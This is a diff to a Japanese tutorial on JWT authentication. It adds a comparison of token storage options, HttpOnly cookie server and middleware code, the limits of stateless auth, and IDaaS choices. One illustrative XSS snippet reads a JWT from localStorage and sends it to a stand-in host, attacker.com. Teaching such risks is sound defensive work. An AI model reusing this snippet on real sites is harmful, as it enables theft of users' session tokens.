@@ -219,7 +219,9 @@ sequenceDiagram
 1. ログインとトークン発行
   - **クライアント→サーバー** : ユーザーがIDとパスワードを入力し、ログインをリクエストします。
   - **サーバー** : 受け取った認証情報を検証します。正しければ、ユーザー情報を含むペイロードと署名を持つJWTを生成します。
-  - **サーバー→クライアント** : 生成したJWTをクライアントに渡します。クライアントは、このJWTを安全な場所に保存します。（例：ローカルストレージやセッションストレージ）
+  - **サーバー→クライアント** : 生成したJWTをクライアントに渡します。クライアントはこのJWTを保存しますが、保存方法により以下のような違いがあります。
+    - **HttpOnly Cookie**：JavaScriptからアクセス不可でXSS攻撃に強い（推奨）
+    - **LocalStorage/SessionStorage**：実装は簡単だがXSS攻撃に脆弱
 2. 保護されたリソースへのアクセス
   - **クライアント→サーバー** : 認証が必要なAPIリクエストを送る際、HTTPの`Authorization`ヘッダーに、保存しておいたJWTを`Bearer`スキームとともに含めます。
   - **サーバー** : リクエストを受け取ると、まず`Authorization`ヘッダーからJWTを取り出します。
@@ -318,7 +320,6 @@ sequenceDiagram
             ApiServer-->>Client: 6. 401 Unauthorized返却
         end
     end
-
 ```
 
 1. **トークンの受信と分割** : `Authorization: Bearer <JWT>`ヘッダーからトークンを抽出し、`.`を基準にヘッダー、ペイロード、署名の3つのパートに分割します。
@@ -583,7 +584,7 @@ const mockUser = {
   id: 'user-123',
   email: 'test@example.com',
   // パスワードはハッシュ化して保存する
-  passwordHash: bcrypt.hashSync('password123', 10), 
+  passwordHash: bcrypt.hashSync('password123', 10),
   role: 'user'
 };
 
@@ -759,6 +760,109 @@ curl http://localhost:3001/api/profile \
   }
 }
 ```
+
+## 5.5 トークンの安全な保存方法
+
+JWTをクライアント側でどこに保存するかは、セキュリティ的に重要なポイントになります。
+
+### 保存場所の比較
+
+| 保存場所 | XSS耐性 | CSRF耐性 | JavaScriptアクセス | 推奨度 |
+|---------|---------|----------|-------------------|--------|
+| localStorage | ❌ | ✅ | 可能 | 低 |
+| sessionStorage | ❌ | ✅ | 可能 | 低 |
+| HttpOnly Cookie | ✅ | ⚠️ (要対策) | 不可 | 高 |
+
+### XSS攻撃のリスク
+
+```javascript
+// XSS攻撃の例：悪意のあるスクリプトが注入された場合
+const stolenToken = localStorage.getItem('jwt_token');
+// 攻撃者のサーバーに送信
+fetch('https://attacker.com/steal', {
+  method: 'POST',
+  body: JSON.stringify({ token: stolenToken })
+});
+```
+
+### HttpOnly Cookieの実装
+
+**サーバー側の実装**
+```javascript
+// controllers/authController.js の修正
+const login = async (req, res) => {
+  // ... 認証処理 ...
+
+  const token = jwt.sign(payload, secretKey, options);
+
+  // HttpOnly Cookieとして設定
+  res.cookie('jwt_token', token, {
+    httpOnly: true,     // JavaScriptからアクセス不可
+    secure: true,       // HTTPS通信でのみ送信
+    sameSite: 'strict', // CSRF攻撃対策
+    maxAge: 3600000     // 1時間（ミリ秒）
+  });
+
+  res.json({ message: 'ログインに成功しました。' });
+};
+```
+
+**ミドルウェアの修正**
+
+```javascript
+// middleware/authMiddleware.js の修正
+const authenticateToken = (req, res, next) => {
+  // Cookieからトークンを取得
+  const token = req.cookies?.jwt_token;
+
+  if (!token) {
+    return res.status(401).json({ error: '認証トークンが必要です。' });
+  }
+
+  // 以下、検証処理は同じ
+};
+```
+
+**クライアント側の実装変更**
+
+```javascript
+// Cookieは自動的に送信されるため、明示的な設定は不要
+fetch('/api/profile', {
+  credentials: 'include'  // Cookieを含めて送信
+});
+```
+
+### 5.6 ステートレス認証の限界
+
+JWTベースの認証・認可には以下の課題があります。
+
+**トークンの即座の無効化が困難**
+- セッションと異なり、有効期限前のトークンを無効化できない
+- ユーザーのログアウトやアカウント停止時の対応が複雑
+
+**解決策とトレードオフ**
+- **ブラックリスト管理**：無効化したいトークンをDBに保存（ステートフルになる）
+- **短い有効期限**：頻繁な更新が必要（UXの低下）
+- **リフレッシュトークン**：実装の複雑化
+
+## 6. Production環境での実践的な選択肢
+
+### 6.1 IDaaS（Identity as a Service）の活用
+
+実際のProduction環境では、以下の理由からIDaaSを利用することも選択肢となってきます。
+
+#### 主なIDaaSサービス
+- **Auth0**：柔軟なカスタマイズが可能
+- **Firebase Authentication**：Googleのエコシステムとの連携
+- **AWS Cognito**：AWSサービスとの統合
+- **Okta**：エンタープライズ向け
+
+#### IDaaSを選ぶメリット
+- セキュリティのベストプラクティスが組み込み済み
+- トークンの無効化、多要素認証などの高度な機能
+- コンプライアンス対応（GDPR、SOC2など）
+- 開発工数の大幅削減
+
 
 ## まとめ
 
